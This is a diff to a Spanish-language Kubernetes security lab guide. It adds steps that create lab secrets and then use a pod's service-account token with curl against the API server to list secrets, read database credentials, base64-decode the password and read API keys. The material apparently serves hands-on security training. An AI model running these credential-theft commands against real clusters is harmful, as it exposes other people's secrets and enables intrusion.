@@ -28,6 +28,9 @@ API Server de Kubernetes.
 # Crear el namespace y el pod vulnerable
 kubectl apply -f vulnerable-pod.yaml
 
+# Crear secrets sensibles que el atacante podra exfiltrar
+kubectl apply -f secrets-lab.yaml
+
 # Crear el Role y RoleBinding que da acceso a secrets
 kubectl apply -f role-binding-vulnerable.yaml
 
@@ -65,9 +68,21 @@ curl -sk $APISERVER/api/v1/namespaces/lab1-token/secrets \
 ### Paso 4 — Verificar el impacto
 
 ```bash
-# Dentro del pod: decodificar secrets encontrados
+# Dentro del pod: listar nombres de los secrets
 curl -sk $APISERVER/api/v1/namespaces/lab1-token/secrets \
-  -H "Authorization: Bearer $TOKEN" | grep -o '"[^"]*"' | head -20
+  -H "Authorization: Bearer $TOKEN" | grep '"name"'
+
+# Leer un secret especifico (credenciales de BD)
+curl -sk $APISERVER/api/v1/namespaces/lab1-token/secrets/db-credentials \
+  -H "Authorization: Bearer $TOKEN"
+
+# Decodificar el password en base64
+curl -sk $APISERVER/api/v1/namespaces/lab1-token/secrets/db-credentials \
+  -H "Authorization: Bearer $TOKEN" | grep '"password"' | awk -F'"' '{print $4}' | base64 -d
+
+# Leer API keys robadas
+curl -sk $APISERVER/api/v1/namespaces/lab1-token/secrets/api-keys \
+  -H "Authorization: Bearer $TOKEN"
 
 # Salir del pod
 exit
